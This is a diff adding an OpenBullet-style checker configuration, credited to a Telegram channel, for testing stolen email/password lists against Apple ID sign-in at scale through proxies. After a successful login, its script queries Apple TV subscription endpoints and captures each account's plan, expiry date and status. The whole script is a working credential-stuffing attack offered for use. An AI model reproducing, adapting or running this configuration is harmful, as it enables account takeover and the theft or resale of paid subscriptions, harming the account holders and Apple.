@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "APPLE - TV Config ",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-01T18:11:32.7587597+05:30",
+  "AdditionalInfo": "Telegram Channel : @ConfigDocxz",
+  "Author": "themutualguy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://idmsa.apple.com/appleauth/auth/signin" 
+  CONTENT "{\"accountName\":\"<USER>\",\"rememberMe\":false,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Host: idmsa.apple.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Apple-Widget-Key: 06f8d74b71c73757a2f82158d5e948ae7bae11ec45fda9a58690f55e35945c51" 
+  HEADER "X-Apple-Frame-Id: auth-q762lnew-c634-ct90-210b-2p1ahtlv" 
+  HEADER "Origin: https://idmsa.apple.com" 
+  HEADER "X-Apple-I-FD-Client-Info: {\"U\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\",\"L\":\"en\",\"Z\":\"GMT+05:30\",\"V\":\"1.1\",\"F\":\".Ga44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZr_WhXTA2s.XTVV26y8GGEDd5ihORoVyFGh8cmvSuCKzIlnY6xljQlpRD_uqwoxcFqREMqgXK_Pmtd0SHp815LyjaY2.rINj.rIN4WzcjftckcKyAd65hz74WySXvOxwawgCgIlNU.3Io3.Nzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWojLrabh15nWuypZHgfLMC7AwvvuyPBDovJn_b_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1a_113o78F4NCaPs2dI_AIQjvEodUW2vqCReF.j92eBSkMk8HlVH_VdI_0DJFvQj_UW_UW_xv5icCmd.1weihq7GY5BNveBBNlYCa1nkBMfs.E3n\"}" 
+  HEADER "X-Apple-Locale: en-us" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Apple-Domain-Id: 2" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://idmsa.apple.com/appleauth/auth/signin?widgetKey=06f8d74b71c73757a2f82158d5e948ae7bae11ec45fda9a58690f55e35945c51&language=en-us&iframeId=auth-q762lnew-c634-ct90-210b-2p1ahtlv&rv=3" 
+  HEADER "Accept-Language: en,pt;q=0.9,hi;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate\"" 
+
+#keycheck KEYCHECK 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "This Apple ID has been locked for security " 
+  KEYCHAIN Failure OR 
+    KEY "Your Apple ID or password was incorrect" 
+  KEYCHAIN Success OR 
+    KEY "restricted" 
+    KEY "\"authType\" : \"restricted\"" 
+
+#account REQUEST POST "https://buy.itunes.apple.com/account/web/auth" 
+  CONTENT "{\"webAuthorizationFlowContext\":\"tv\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: buy.itunes.apple.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://tv.apple.com" 
+  HEADER "content-type: application/json" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://tv.apple.com/includes/commerce/authenticate?product=tv&isFullscreen=false&isModal=true&iso2code=us&locale=en-us&devToken=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IldlYlBsYXlLaWQifQ.eyJpc3MiOiJBTVBXZWJQbGF5IiwiaWF0IjoxNTY5ODc5MDkzLCJleHAiOjE1NzYwOTk4OTN9.KG15EeGBcW5P-Tt17oSTWQITfs-9n36XJtJnmZZkaCITetEZuVKD5GQM0Rl4eNSs6dj6ujtTKKjOSfVDElDVPQ&productVersion=1948.26.0" 
+  HEADER "Accept-Language: en,pt;q=0.9,hi;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Subcripciones REQUEST GET "https://buy.itunes.apple.com/commerce/web/subscription?subscriptionType=tv" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: buy.itunes.apple.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://tv.apple.com" 
+  HEADER "x-apple-store-front: 143479-2,8" 
+  HEADER "accept-language: en-gb" 
+  HEADER "content-type: application/json" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://tv.apple.com/includes/commerce/account/settings?product=tv&isFullscreen=true&isModal=false&iso2code=us&locale=en-us&devToken=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IldlYlBsYXlLaWQifQ.eyJpc3MiOiJBTVBXZWJQbGF5IiwiaWF0IjoxNTY5ODc5MDkzLCJleHAiOjE1NzYwOTk4OTN9.KG15EeGBcW5P-Tt17oSTWQITfs-9n36XJtJnmZZkaCITetEZuVKD5GQM0Rl4eNSs6dj6ujtTKKjOSfVDElDVPQ&productVersion=1948.26.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Plan PARSE "<SOURCE>" LR "displayName\":\"" "\"" -> CAP "Plan" 
+
+#Finaliza PARSE "<SOURCE>" LR "expirationTimestamp\":" ",\"" -> VAR "Finaliza" 
+
+#finaliza FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" 
+
+#Estatus PARSE "<SOURCE>" LR "status\":\"" "\"" -> CAP "Estatus" 
+
+#Credit FUNCTION Constant "themutualguy" -> CAP "Config By " 
